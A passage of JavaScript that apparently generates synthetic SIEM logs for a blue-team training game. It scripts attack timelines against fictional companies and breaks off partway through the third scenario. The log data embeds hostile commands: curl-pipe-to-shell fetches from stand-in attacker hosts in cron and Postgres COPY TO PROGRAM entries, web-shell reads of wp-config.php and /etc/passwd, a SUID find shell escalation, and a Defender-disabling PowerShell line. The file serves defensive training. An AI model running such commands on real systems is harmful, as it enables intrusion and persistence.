// The hand-written attack timelines hidden in the SIEM noise, one per CCDC lab scenario.
// A story is: profile (which hosts/users the noise uses), build(ctx) -> sparse event specs placed at their
// times, waveLines() for live red-team bursts, and `hunt` (the questions the player answers from the logs).
//
// Spec shape: { t (epoch s), kind: web|auth|fw|win|mail|db|cron, sub, host, fields }. The generator renders the
// exact product log text from kind/sub/fields. All times below are US Eastern (EDT) wall clock.
// Addresses: attacker/C2 in RFC 5737 (203.0.113/24, 198.51.100/24); LAN in RFC 1918.

const at = (s) => {
  const m = s.match(/^(\d{4})-(\d\d)-(\d\d) (\d\d):(\d\d):(\d\d)$/);
  return Date.UTC(+m[1], +m[2] - 1, +m[3], +m[4], +m[5], +m[6]) / 1000 + 4 * 3600;
};
const pr = (n) => 1024 + ((Math.imul(n + 7, 2654435761) >>> 8) % 60000); // deterministic "random" port
const pid = (n) => 1000 + ((Math.imul(n + 3, 40503) >>> 4) % 60000);
const hx = (n, w) => (Math.imul(n + 1, 2654435761) >>> 0).toString(16).padStart(w, '0').slice(0, w);
function span(t0, t1, n, fn) {
  const out = [];
  for (let k = 0; k < n; k++) out.push(fn(k, t0 + Math.floor(((t1 - t0) * k) / Math.max(1, n - 1))));
  return out;
}

// ---- spec builders ----
const web = (t, host, ip, method, uri, status, bytes, ua = 'curl/7.68.0') => ({ t, kind: 'web', host, fields: { src_ip: ip, method, uri, status, bytes, useragent: ua, referer: '-', dest_port: 443, user: '-' } });
const auth = (t, host, sub, user, ip, extra = {}) => ({ t, kind: 'auth', sub, host, fields: { src_ip: ip, user, src_port: pr(t), pid: pid(t), dest_port: 22, app: 'sshd', process: 'sshd', action: /^(failed|invalid|wpfail)/.test(sub) ? 'failure' : 'success', ...extra } });
const sudo = (t, host, user, pwd, command) => auth(t, host, 'sudo', user, '', { tty: 'unknown', pwd, command, app: 'sudo', process: 'sudo', src_ip: '', dest_port: '' });
const fw = (t, host, src, dst, sp, dp, action, dir, proto = 'tcp') => ({ t, kind: 'fw', host, fields: { src_ip: src, dest_ip: dst, src_port: sp, dest_port: dp, proto, action, dir, iface: 'em0', rule: action === 'pass' ? 8 : 5, tracker: action === 'pass' ? '1000000108' : '1000000103', flags: 'S', ttl: 48, ipid: pid(t) % 65535, pid: 30000 + (t % 9000), length: 60 } });
const win = (t, host, code, fields) => ({ t, kind: 'win', host, fields: { EventCode: code, action: code === 4625 ? 'failure' : 'success', dest: host, ...fields } });
const cron = (t, host, command) => ({ t, kind: 'cron', sub: 'cron', host, fields: { user: 'root', pid: pid(t), command, app: 'cron', process: 'CRON' } });

const SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080, 8443, 9200];
const NMAP_UA = 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)';

// =====================================================================================================
// Cedarline Freight Co.
// =====================================================================================================
const ATT1 = '203.0.113.66';
const C2_1 = '198.51.100.200';
const CED_PROFILE = {
  web: 'web01', db: 'db01', mail: 'mail01', dc: 'dc01', ws: 'ws01', fw: 'edge-fw',
  linux: ['web01', 'web01', 'mail01', 'db01'], linuxUsers: ['ops', 'deploy', 'backup'],
  adUsers: ['a.flores', 'r.pike', 'm.ortiz', 'd.kim', 'l.okoye', 't.nguyen', 's.patel', 'k.brandt', 'j.walsh', 'e.cruz', 'h.sato', 'p.moreau', 'svc-backup'],
  privUsers: ['Administrator', 'svc-backup'], winMachines: ['WS01', 'WS02', 'WS03', 'WS04', 'WS05', 'DC01'],
  lanHosts: ['ws01', 'web01', 'mail01', 'db01', 'dc01'], lanPrefix: '10.10.10', publicHost: 'www.cedarline.example',
  domain: 'cedarline.local', netbios: 'CEDARLINE', dbKind: 'mysql', wp: true,
};

function buildCedarline(ctx) {
  const N = (base, min) => Math.max(min, Math.round(base * ctx.scale));
  const WEB = 'web01'; const MAIL = 'mail01'; const DB = 'db01'; const DC = 'dc01'; const WS = 'ws01'; const FW = 'edge-fw';
  const out = [];
  const wan = ctx.P.wanIp;
  // 1. Recon: a port sweep through the (any-any) edge firewall, then WordPress user enumeration
  span(at('2026-10-28 22:41:05'), at('2026-10-28 22:44:10'), SCAN_PORTS.length, (k, t) => out.push(fw(t, FW, ATT1, wan, pr(k + 1), SCAN_PORTS[k], 'pass', 'in')));
  out.push(web(at('2026-10-28 22:44:20'), WEB, ATT1, 'GET', '/', 200, 11842, NMAP_UA));
  out.push(web(at('2026-10-28 22:44:21'), WEB, ATT1, 'GET', '/wp-login.php', 200, 4190, NMAP_UA));
  out.push(web(at('2026-10-28 22:44:52'), WEB, ATT1, 'GET', '/wp-json/wp/v2/users', 200, 1322, 'python-requests/2.28.1'));
  out.push(web(at('2026-10-28 22:44:55'), WEB, ATT1, 'GET', '/?author=1', 301, 235, 'python-requests/2.28.1'));
  // 2. Password spray on wp-login (the Apache side) plus WP Fail2Ban-style failures in auth.log, then ONE success
  const n = N(1800, 60);
  const s0 = at('2026-10-28 22:58:10'); const s1 = at('2026-10-28 23:07:11');
  span(s0, s1, n, (k, t) => out.push(web(t, WEB, ATT1, 'POST', '/wp-login.php', 200, 5190 + (k % 90), 'python-requests/2.28.1')));
  span(s0, s1, n, (k, t) => out.push(auth(t, WEB, 'wpfail', 'admin', ATT1, { site: ctx.P.domain, dest_port: 443, app: 'wordpress', process: 'wordpress' })));
  const win1 = at('2026-10-28 23:07:12');
  out.push(web(win1, WEB, ATT1, 'POST', '/wp-login.php', 302, 0, 'python-requests/2.28.1'));
  out.push(auth(win1, WEB, 'wpok', 'admin', ATT1, { site: ctx.P.domain, dest_port: 443, app: 'wordpress', process: 'wordpress' }));
  out.push(web(at('2026-10-28 23:07:14'), WEB, ATT1, 'GET', '/wp-admin/', 200, 38211, 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'));
  // 3. Web shell upload and use
  out.push(web(at('2026-10-28 23:09:31'), WEB, ATT1, 'POST', '/wp-admin/async-upload.php', 200, 612, 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'));
  const shell = '/wp-content/uploads/2026/10/stats.php';
  const cmds = ['id', 'whoami', 'uname+-a', 'cat+/var/www/html/wp-config.php', 'sudo+-l', 'ls+-la+/root', 'crontab+-l', 'cat+/etc/passwd', 'ip+a', 'netstat+-tulpn', 'cat+/etc/hosts', 'ls+/home'];
  span(at('2026-10-28 23:10:44'), at('2026-10-28 23:31:20'), cmds.length, (k, t) => out.push(web(t, WEB, ATT1, 'GET', `${shell}?cmd=${cmds[k]}`, 200, 54 + k * 130)));
  out.push(sudo(at('2026-10-28 23:14:21'), WEB, 'www-data', '/var/www/html/wp-content/uploads/2026/10', '/usr/bin/crontab -l'));
  out.push(sudo(at('2026-10-28 23:19:05'), WEB, 'www-data', '/var/www/html/wp-content/uploads/2026/10', '/usr/bin/crontab -e'));
  // root cron re-drop, every 10 minutes until the round starts
  const nC = Math.floor((ctx.roundStart - at('2026-10-28 23:20:00')) / 600);
  span(at('2026-10-28 23:20:00'), at('2026-10-28 23:20:00') + nC * 600, nC, (k, t) => out.push(cron(t, WEB, 'curl -s http://203.0.113.66/u.sh | sh')));
  // 4. MySQL (exposed to the internet): a few guesses as root
  span(at('2026-10-28 23:18:02'), at('2026-10-28 23:18:40'), 6, (k, t) => out.push({ t, kind: 'db', sub: 'my_denied', host: DB, fields: { src_ip: ATT1, pid: pid(t), ms: String(120 + k * 70), thread: String(2200 + k), user: 'root', dest_port: 3306, action: 'failure', app: 'mysqld', pw: 'YES' } }));
  span(at('2026-10-28 23:18:02'), at('2026-10-28 23:19:30'), 9, (k, t) => out.push(fw(t, FW, ATT1, ctx.P.ip(DB), pr(k + 40), 3306, 'pass', 'in')));
  // 5. SSH to mail01: brute root, one Accepted password, then a planted key
  const nS = N(2000, 60);
  span(at('2026-10-28 23:20:10'), at('2026-10-28 23:32:40'), nS, (k, t) => out.push(auth(t, MAIL, 'failed_user', 'root', ATT1)));
  const acc = at('2026-10-28 23:32:41');
  out.push(auth(acc, MAIL, 'accepted_pw', 'root', ATT1));
  out.push(auth(acc, MAIL, 'session_open', 'root', ATT1));
  const FP = 'k4Qn0Zr9mXbT2uLw7YhVd1sPcE8aJf3GoNi5RtB6yCg';
  for (const when of ['2026-10-28 23:52:09', '2026-10-29 04:11:33', '2026-10-29 21:40:02', '2026-10-30 11:05:48', '2026-10-30 23:15:20', '2026-10-31 06:48:07']) {
    out.push(auth(at(when), MAIL, 'accepted_key', 'root', ATT1, { fp: FP }));
  }
  // 6. Pivot to the DC with a stolen admin credential; create svc-backup2 and make it Domain Admin
  const L = (id, k) => ctx.P.ip(id) || k;
  out.push(win(at('2026-10-29 00:20:12'), DC, 4624, { user: 'Administrator', Account_Name: 'Administrator', Logon_Type: 3, src_ip: L(MAIL), src_port: 52114, Workstation_Name: 'MAIL01', Account_Domain: 'CEDARLINE' }));
  out.push(win(at('2026-10-29 00:20:12'), DC, 4672, { user: 'Administrator', Account_Name: 'Administrator', Logon_Type: 3 }));
  out.push(win(at('2026-10-29 00:24:07'), DC, 4720, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'CEDARLINE', Target_Account_Name: 'svc-backup2', user: 'svc-backup2' }));
  out.push(win(at('2026-10-29 00:24:19'), DC, 4724, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'CEDARLINE', Target_Account_Name: 'svc-backup2', user: 'svc-backup2' }));
  out.push(win(at('2026-10-29 00:24:31'), DC, 4728, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'CEDARLINE', Target_Account_Name: 'svc-backup2', user: 'svc-backup2', Group_Name: 'Domain Admins', Group_Rid: 512 }));
  out.push(win(at('2026-10-29 00:26:02'), DC, 4624, { user: 'svc-backup2', Account_Name: 'svc-backup2', Logon_Type: 3, src_ip: L(MAIL), src_port: 52380, Workstation_Name: 'MAIL01', Account_Domain: 'CEDARLINE' }));
  out.push(win(at('2026-10-29 00:26:02'), DC, 4672, { user: 'svc-backup2', Account_Name: 'svc-backup2', Logon_Type: 3 }));
  // decoys: a legitimate HR account creation the same morning
  out.push(win(at('2026-10-29 09:10:44'), DC, 4720, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'CEDARLINE', Target_Account_Name: 'n.hughes', user: 'n.hughes' }));
  out.push(win(at('2026-10-29 09:11:20'), DC, 4728, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'CEDARLINE', Target_Account_Name: 'n.hughes', user: 'n.hughes', Group_Name: 'Dispatch', Group_Rid: 1117 }));
  // 7. Scheduled-task persistence on the accounting workstation
  out.push(win(at('2026-10-29 00:40:51'), WS, 4624, { user: 'svc-backup2', Account_Name: 'svc-backup2', Logon_Type: 3, src_ip: L(DC), src_port: 49733, Workstation_Name: 'DC01', Account_Domain: 'CEDARLINE' }));
  out.push(win(at('2026-10-29 00:41:15'), WS, 4698, { Subject_Account_Name: 'svc-backup2', Subject_Account_Domain: 'CEDARLINE', Task_Name: 'SystemCheck', Task_Command: 'C:\\ProgramData\\Microsoft\\Crypto\\syschk.exe', user: 'svc-backup2' }));
  // 8. C2 beacon: ws01 -> 198.51.100.200:8443 every five minutes, allowed outbound by the firewall
  const b0 = at('2026-10-29 00:42:00'); const nB = Math.floor((ctx.roundStart - b0) / 300);
  span(b0, b0 + nB * 300, nB, (k, t) => out.push(fw(t, FW, L(WS), C2_1, pr(k + 900), 8443, 'pass', 'out')));
  return out;
}

// Per-finding red-team bursts: what the red team does to THIS weakness shows up in the logs as that activity.
function findingWave(fid, att, P, host, bad, t, n) {
  const out = [];
  switch (fid) {
    case 'firewall-anyany':
      for (let k = 0; k < n; k++) out.push(fw(t, P.fw, att, ctx_wan(P), pr(k + 5), [3389, 445, 3306, 5432, 135, 5900, 23][k % 7], 'pass', 'in'));
      return out;
    case 'web-admin-default':
      for (let k = 0; k < n; k++) out.push(web(t, host, att, 'POST', '/wp-login.php', bad && k >= n - 3 ? 302 : 200, bad && k >= n - 3 ? 0 : 4410, 'python-requests/2.31.0'));
      if (bad) out.push(web(t, host, att, 'GET', '/wp-admin/plugin-install.php', 200, 61230, 'python-requests/2.31.0'));
      return out;
    case 'web-shell':
      for (let k = 0; k < n; k++) out.push(web(t, host, att, 'GET', `/wp-content/uploads/2026/10/stats.php?cmd=${['id', 'whoami', 'uname+-a', 'crontab+-l', 'cat+/etc/passwd'][k % 5]}`, 200, 80 + k));
      return out;
    case 'mysql-exposed':
      for (let k = 0; k < n; k++) out.push({ t, kind: 'db', sub: 'my_denied', host, fields: { src_ip: att, pid: pid(k), ms: '310', thread: String(3000 + k), user: 'root', dest_port: 3306, action: bad && k >= n - 3 ? 'success' : 'failure', app: 'mysqld', pw: 'YES' } });
      return out;
    case 'mail-open-relay':
      for (let k = 0; k < n; k++) out.push({ t, kind: 'mail', sub: k % 3 === 2 ? 'sent' : 'connect', host, fields: { src_ip: att, pid: pid(k), lip: P.web ? '10.10.10.30' : '10.10.10.30', session: hx(k, 8) + '/' + hx(k + 9, 8), qid: hx(k + 3, 10).toUpperCase(), qid2: hx(k + 4, 5), from: `promo${k}@spam-sender.example`, rcpt: `victim${k}@gmail.example`, helo: 'kali', size: 31000 + k * 17, relay: 'mx.gmail.example', relay_ip: '192.0.2.44', delay: '0.42', action: 'success' } });
      return out;
    case 'ssh-root-key':
      for (let k = 0; k < n; k++) {
        if (bad && k >= n - 3) out.push(auth(t, host, k === n - 1 ? 'session_open' : 'accepted_key', 'root', att, { fp: 'k4Qn0Zr9mXbT2uLw7YhVd1sPcE8aJf3GoNi5RtB6yCg' }));
        else out.push(auth(t, host, 'failed_user', 'root', att));
      }
      return out;
    case 'rogue-da': case 'guest-admin':
      for (let k = 0; k < n; k++) {
        const who = fid === 'rogue-da' ? 'svc-backup2' : 'Guest';
        const code = bad && k >= n - 3 ? [4624, 4672, 4728][k - (n - 3)] : 4625;
        out.push(win(t, host, code, { user: who, Account_Name: who, Logon_Type: 3, src_ip: att, src_port: pr(k), Workstation_Name: 'KALI', Account_Domain: P.netbios, Target_Account_Name: who, Group_Name: fid === 'rogue-da' ? 'Domain Admins' : 'Account Operators' }));
      }
      return out;
    case 'smbv1-dc': case 'print-spooler':
      for (let k = 0; k < n; k++) out.push(fw(t, P.fw, att, `${P.lanPrefix || '10.10.10'}.10`, pr(k + 11), fid === 'smbv1-dc' ? 445 : 135, 'pass', 'in'));
      if (bad) out.push(win(t, host, 4688, { user: 'SYSTEM', Account_Name: 'SYSTEM', New_Process_Name: fid === 'smbv1-dc' ? 'C:\\Windows\\System32\\cmd.exe' : 'C:\\Windows\\System32\\spoolsv.exe', Creator_Process_Name: 'C:\\Windows\\System32\\services.exe' }));
      return out;
    case 'ws-schtask': case 'ws-local-admin':
      for (let k = 0; k < n; k++) out.push(win(t, host, bad && k >= n - 2 ? (fid === 'ws-schtask' ? 4698 : 4720) : 4625, { user: 'Administrator', Account_Name: 'Administrator', Logon_Type: 3, src_ip: att, src_port: pr(k), Workstation_Name: 'KALI', Account_Domain: P.netbios, Task_Name: 'SystemCheck', Target_Account_Name: 'support2' }));
      return out;
    case 'exposed-git':
      for (let k = 0; k < n; k++) out.push(web(t, host, att, 'GET', ['/.git/HEAD', '/.git/config', '/.git/index', '/.git/objects/pack/', '/.env'][k % 5], bad ? 200 : 403, bad ? 211 + k * 9 : 199, 'git-dumper/1.0'));
      return out;
    case 'postgres-trust':
      for (let k = 0; k < n; k++) out.push({ t, kind: 'db', sub: bad && k > 2 ? 'pg_dur' : 'pg_auth', host, fields: { src_ip: att, src_port: pr(k), pid: pid(k), ms: '211', user: 'postgres', database: 'members', dest_port: 5432, statement: bad ? `COPY members TO PROGRAM 'curl http://${att}/x|sh'` : 'SELECT version()', duration: '12.411', app: 'psql', action: 'success' } });
      return out;
    case 'app-cron': case 'web-shell2':
      for (let k = 0; k < n; k++) out.push(cron(t + k, host, '/tmp/.sysupd.sh >/dev/null 2>&1'));
      return out;
    case 'smb-signing':
      for (let k = 0; k < n; k++) out.push(fw(t, P.fw, att, `${P.lanPrefix || '10.10.10'}.10`, pr(k + 21), 445, 'pass', 'in'));
      if (bad) {
        out.push(win(t, host, 4624, { user: 'n.park', Account_Name: 'n.park', Logon_Type: 3, src_ip: att, src_port: pr(n), Workstation_Name: 'KALI', Account_Domain: P.netbios }));
        out.push(win(t, host, 4672, { user: 'n.park', Account_Name: 'n.park', Logon_Type: 3 }));
      }
      return out;
    case 'weak-pw-policy':
      for (let k = 0; k < n; k++) {
        const ok = bad && k >= n - 2;
        const who = ['n.park', 'd.ibrahim', 'svc-ehr', 'Administrator', 'r.ellis'][k % 5];
        out.push(win(t, host, ok ? 4624 : 4625, { user: who, Account_Name: who, Logon_Type: 3, src_ip: att, src_port: pr(k), Workstation_Name: 'KALI', Account_Domain: P.netbios }));
      }
      return out;
    case 'ws-defender-off':
      for (let k = 0; k < n; k++) out.push(win(t, host, 4688, { user: 'nurse', Account_Name: 'nurse', New_Process_Name: k % 2 ? 'C:\\ProgramData\\Updates\\updsvc.exe' : 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true', Creator_Process_Name: 'C:\\Windows\\explorer.exe' }));
      return out;
    case 'tls-legacy':
      for (let k = 0; k < n; k++) out.push(web(t, host, att, 'GET', ['/login', '/api/v1/patients', '/session/refresh'][k % 3], bad ? 200 : 426, bad ? 2100 + k : 0, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) TLSv1.0'));
      return out;
    case 'suid-find':
      for (let k = 0; k < n; k++) out.push(sudo(t, host, 'www-data', '/var/www/ehr', bad ? '/usr/bin/find . -exec /bin/sh -p ; -quit' : '/usr/bin/find / -perm -4000'));
      return out;
    case 'redis-open':
      for (let k = 0; k < n; k++) out.push(fw(t, P.fw, att, `${P.lanPrefix || '10.10.10'}.40`, pr(k + 31), 6379, 'pass', 'in'));
      if (bad) out.push(auth(t, host, 'accepted_key', 'redis', att, { fp: 'Zq8Lw3Pn7XcV1mHb5TyR0eKd9sGaJf2UoNi4BtC6vYg' }));
      return out;
    default: return null;
  }
}
const ctx_wan = (P) => P.wanIp || '203.0.113.2';

function waveLinesGeneric(att, P) {
  return (ctx, host, outcome, at0, n, findingId) => {
    const out = [];
    const spec = findingId ? findingWave(findingId, att, { ...P, wanIp: ctx.P.wanIp }, host, outcome === 'compromised', at0, n) : null;
    if (spec) return spec;
    const bad = outcome === 'compromised';
    const t = at0;
    if (host === P.web) {
      for (let k = 0; k < n; k++) out.push(web(t, host, att, k % 3 === 0 ? 'POST' : 'GET', bad ? `/wp-content/uploads/2026/10/stats.php?cmd=${['id', 'whoami', 'ls+-la', 'cat+/etc/passwd'][k % 4]}` : ['/wp-login.php', '/xmlrpc.php', '/.env', '/wp-admin/'][k % 4], bad ? 200 : (k % 2 ? 404 : 200), bad ? 80 + k : 4190));
    } else if (host === P.dc || host === P.ws) {
      for (let k = 0; k < n; k++) {
        const code = bad && k >= n - 4 ? [4624, 4672, 4720, 4728][k - (n - 4)] : 4625;
        const f = { user: bad && k >= n - 4 ? 'Administrator' : ['Administrator', 'admin', 'backup', 'guest'][k % 4], Logon_Type: 3, src_ip: att, src_port: pr(k), Workstation_Name: 'KALI', Account_Domain: P.netbios };
        f.Account_Name = f.user;
        if (code === 4720) { f.Target_Account_Name = 'helpdesk2'; f.Subject_Account_Name = 'Administrator'; f.Subject_Account_Domain = P.netbios; }
        if (code === 4728) { f.Target_Account_Name = 'helpdesk2'; f.Group_Name = 'Domain Admins'; f.Subject_Account_Name = 'Administrator'; f.Subject_Account_Domain = P.netbios; }
        out.push(win(t, host, code, f));
      }
    } else if (host === P.fw) {
      for (let k = 0; k < n; k++) out.push(fw(t, host, att, ctx.P.wanIp, pr(k + 5), SCAN_PORTS[(k * 5) % SCAN_PORTS.length], 'pass', 'in'));
    } else if (host === P.db) {
      for (let k = 0; k < n; k++) {
        if (P.dbKind === 'postgres') out.push({ t, kind: 'db', sub: bad && k > 2 ? 'pg_stmt' : 'pg_auth', host, fields: { src_ip: att, src_port: pr(k), pid: pid(k), ms: '211', user: 'hp_app', database: 'members', dest_port: 5432, statement: 'SELECT * FROM members', app: 'psql', action: 'success' } });
        else out.push({ t, kind: 'db', sub: 'my_denied', host, fields: { src_ip: att, pid: pid(k), ms: '310', thread: String(3000 + k), user: bad ? 'root' : 'admin', dest_port: 3306, action: 'failure', app: 'mysqld', pw: 'YES' } });
      }
    } else {
      for (let k = 0; k < n; k++) {
        if (bad && k >= n - 3) out.push(auth(t, host, k === n - 1 ? 'session_open' : 'accepted_key', 'root', att, { fp: 'k4Qn0Zr9mXbT2uLw7YhVd1sPcE8aJf3GoNi5RtB6yCg' }));
        else out.push(auth(t, host, 'failed_user', 'root', att));
      }
    }
    return out;
  };
}

// =====================================================================================================
// Harbor Point Credit Union
// =====================================================================================================
const ATT2 = '203.0.113.131';
const C2_2 = '198.51.100.214';
const HP_PROFILE = {
  web: 'app01', db: 'db01', mail: null, dc: 'dc01', ws: 'ws01', fw: 'edge-fw',
  linux: ['app01', 'app01', 'db01'], linuxUsers: ['ops', 'deploy'],
  adUsers: ['j.okafor', 'm.reyes', 'p.lindqvist', 'c.abara', 'n.dubois', 'f.haddad', 'w.tanaka', 'a.sorensen', 'b.mwangi', 'svc-sql'],
  privUsers: ['Administrator', 'svc-sql'], winMachines: ['WS01', 'TELLER02', 'TELLER03', 'LOAN01', 'DC01'],
  lanHosts: ['ws01', 'app01', 'db01', 'dc01'], lanPrefix: '10.20.30', publicHost: 'portal.harborpoint.example',
  domain: 'harborpoint.local', netbios: 'HARBORPT', dbKind: 'postgres', wp: false,
};

function buildHarbor(ctx) {
  const N = (base, min) => Math.max(min, Math.round(base * ctx.scale));
  const APP = 'app01'; const DB = 'db01'; const DC = 'dc01'; const WS = 'ws01'; const FW = 'edge-fw';
  const out = [];
  const wan = ctx.P.wanIp; const L = (id) => ctx.P.ip(id);
  const GD = 'git-dumper/1.0';
  // 1. Recon through the any-any firewall
  span(at('2026-10-29 03:12:05'), at('2026-10-29 03:15:30'), SCAN_PORTS.length, (k, t) => out.push(fw(t, FW, ATT2, wan, pr(k + 3), SCAN_PORTS[k], 'pass', 'in')));
  // 2. The exposed .git folder is dumped object by object
  const g0 = at('2026-10-29 03:19:20');
  ['/.git/HEAD', '/.git/config', '/.git/index', '/.git/COMMIT_EDITMSG', '/.git/logs/HEAD', '/.git/packed-refs', '/.git/refs/heads/main', '/.git/description'].forEach((u, k) => out.push(web(g0 + k, APP, ATT2, 'GET', u, 200, 23 + k * 61, GD)));
  const nG = N(220, 60);
  span(g0 + 12, at('2026-10-29 03:22:40'), nG, (k, t) => out.push(web(t, APP, ATT2, 'GET', `/.git/objects/${hx(k, 2)}/${hx(k + 99, 8)}${hx(k + 7, 8)}${hx(k + 13, 8)}${hx(k + 21, 8)}${hx(k + 31, 6)}`, 200, 150 + ((k * 37) % 4000), GD)));
  // 3. The leaked DB credential (hp_app) is used from the internet: first successful database login
  const PG = (t, sub, extra) => ({ t, kind: 'db', sub, host: DB, fields: { src_ip: ATT2, src_port: pr(t), pid: 24100, ms: '482', user: 'hp_app', database: 'members', dest_port: 5432, app: 'psql', action: 'success', ...extra } });
  out.push(PG(at('2026-10-29 03:40:51'), 'pg_received', {}));
  out.push(PG(at('2026-10-29 03:40:52'), 'pg_role', { user: 'admin', action: 'failure' }));
  out.push(PG(at('2026-10-29 03:41:06'), 'pg_received', {}));
  out.push(PG(at('2026-10-29 03:41:07'), 'pg_auth', {}));
  out.push(PG(at('2026-10-29 03:41:44'), 'pg_stmt', { statement: 'SELECT table_name FROM information_schema.tables WHERE table_schema = \'public\';' }));
  out.push(PG(at('2026-10-29 03:42:30'), 'pg_stmt', { statement: 'SELECT count(*) FROM members;' }));
  out.push(PG(at('2026-10-29 03:47:12'), 'pg_dur', { duration: '8120.443', statement: 'COPY (SELECT * FROM members) TO STDOUT WITH CSV HEADER' }));
  out.push(fw(at('2026-10-29 03:41:06'), FW, ATT2, L(DB), pr(5), 5432, 'pass', 'in'));
  // 4. SSH to app01 with a password found in the repo, then root persistence via cron
  span(at('2026-10-29 04:12:00'), at('2026-10-29 04:12:30'), 4, (k, t) => out.push(auth(t, APP, 'failed_user', 'deploy', ATT2)));
  out.push(auth(at('2026-10-29 04:12:33'), APP, 'accepted_pw', 'deploy', ATT2));
  out.push(auth(at('2026-10-29 04:12:33'), APP, 'session_open', 'deploy', ATT2));
  out.push(sudo(at('2026-10-29 04:14:02'), APP, 'deploy', '/home/deploy', '/usr/bin/tee /etc/cron.d/portal-sync'));
  out.push(sudo(at('2026-10-29 04:14:40'), APP, 'deploy', '/home/deploy', '/usr/bin/tee /usr/local/bin/portal-sync.sh'));
  out.push(sudo(at('2026-10-29 04:15:10'), APP, 'deploy', '/home/deploy', '/bin/chmod +x /usr/local/bin/portal-sync.sh'));
  const c0 = at('2026-10-29 04:20:00'); const nC = Math.floor((ctx.roundStart - c0) / 300);
  span(c0, c0 + nC * 300, nC, (k, t) => out.push(cron(t, APP, '/usr/local/bin/portal-sync.sh')));
  // 5. Pivot to the domain controller as svc-sql; Print Spooler abuse; Guest enabled and made Account Operator
  out.push(win(at('2026-10-29 04:31:18'), DC, 4624, { user: 'svc-sql', Account_Name: 'svc-sql', Logon_Type: 3, src_ip: L(APP), src_port: 51770, Workstation_Name: 'APP01', Account_Domain: 'HARBORPT' }));
  out.push(win(at('2026-10-29 04:33:50'), DC, 808, { Module: 'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\kernelbase.dll', user: 'SYSTEM' }));
  out.push(win(at('2026-10-29 04:35:12'), DC, 4722, { Subject_Account_Name: 'DC01$', Subject_Account_Domain: 'HARBORPT', Target_Account_Name: 'Guest', user: 'Guest' }));
  out.push(win(at('2026-10-29 04:35:40'), DC, 4732, { Subject_Account_Name: 'DC01$', Subject_Account_Domain: 'HARBORPT', Target_Account_Name: 'Guest', user: 'Guest', Group_Name: 'Account Operators', Group_Rid: 548 }));
  // 6. The teller workstation: a local admin account and a beacon
  out.push(win(at('2026-10-29 05:02:11'), WS, 4624, { user: 'svc-sql', Account_Name: 'svc-sql', Logon_Type: 3, src_ip: L(APP), src_port: 52011, Workstation_Name: 'APP01', Account_Domain: 'HARBORPT' }));
  out.push(win(at('2026-10-29 05:03:20'), WS, 4720, { Subject_Account_Name: 'svc-sql', Subject_Account_Domain: 'HARBORPT', Target_Account_Name: 'svc_update', Target_Account_Domain: 'WS01', user: 'svc_update' }));
  out.push(win(at('2026-10-29 05:03:41'), WS, 4732, { Subject_Account_Name: 'svc-sql', Subject_Account_Domain: 'HARBORPT', Target_Account_Name: 'svc_update', user: 'svc_update', Group_Name: 'Administrators', Group_Rid: 544 }));
  const b0 = at('2026-10-29 05:10:00'); const nB = Math.floor((ctx.roundStart - b0) / 600);
  span(b0, b0 + nB * 600, nB, (k, t) => out.push(fw(t, FW, L(WS), C2_2, pr(k + 700), 4443, 'pass', 'out')));
  // decoy: a legitimate local-user creation on another day
  out.push(win(at('2026-10-30 08:20:10'), DC, 4720, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'HARBORPT', Target_Account_Name: 'k.ibarra', user: 'k.ibarra' }));
  return out;
}

// =====================================================================================================
// Ridgeview Regional Medical Clinic: unauthenticated Redis -> planted SSH key -> pivot -> rogue Domain Admin
// =====================================================================================================
const ATT3 = '203.0.113.88';
const C2_3 = '198.51.100.77';
const RV_PROFILE = {
  web: 'ehr01', db: 'db01', mail: null, dc: 'dc01', ws: 'ws01', fw: 'edge-fw',
  linux: ['ehr01', 'ehr01', 'db01'], linuxUsers: ['ops', 'deploy', 'analyst'],
  adUsers: ['n.park', 'd.ibrahim', 'r.ellis', 'm.castillo', 't.osei', 'l.brandt', 'a.nakamura', 'j.fontaine', 'k.vance', 'svc-ehr'],
  privUsers: ['Administrator', 'svc-ehr'], winMachines: ['WS01', 'WS02', 'NURSE03', 'FRONTDESK1', 'DC01'],
  lanHosts: ['ws01', 'ehr01', 'db01', 'dc01'], lanPrefix: '10.30.40', publicHost: 'ehr.ridgeview.example',
  domain: 'ridgeview.local', netbios: 'RIDGEVIEW', dbKind: 'mysql', wp: false,
};

function buildRidgeview(ctx) {
  const N = (base, min) => Math.max(min, Math.round(base * ctx.scale));
  const EHR = 'ehr01'; const DB = 'db01'; const DC = 'dc01'; const WS = 'ws01'; const FW = 'edge-fw';
  const out = [];
  const wan = ctx.P.wanIp; const L = (id) => ctx.P.ip(id);
  const PORTS = [22, 53, 80, 135, 139, 443, 445, 2575, 3306, 3389, 5985, 6379, 8080];
  // 1. Recon through the any-any edge firewall
  span(at('2026-10-29 01:52:10'), at('2026-10-29 01:55:40'), PORTS.length, (k, t) => out.push(fw(t, FW, ATT3, wan, pr(k + 2), PORTS[k], 'pass', 'in')));
  // 2. Redis (6379) probed and driven from the internet: a burst of connections to db01
  const nR = N(40, 14);
  span(at('2026-10-29 02:18:05'), at('2026-10-29 02:24:30'), nR, (k, t) => out.push(fw(t, FW, ATT3, L(DB), pr(k + 60), 6379, 'pass', 'in')));
  // 3. First login: an SSH key planted through CONFIG SET dir/dbfilename gives a shell as the redis user
  const FP = 'Zq8Lw3Pn7XcV1mHb5TyR0eKd9sGaJf2UoNi4BtC6vYg';
  out.push(auth(at('2026-10-29 02:36:19'), DB, 'accepted_key', 'redis', ATT3, { fp: FP }));
  out.push(auth(at('2026-10-29 02:36:19'), DB, 'session_open', 'redis', ATT3));
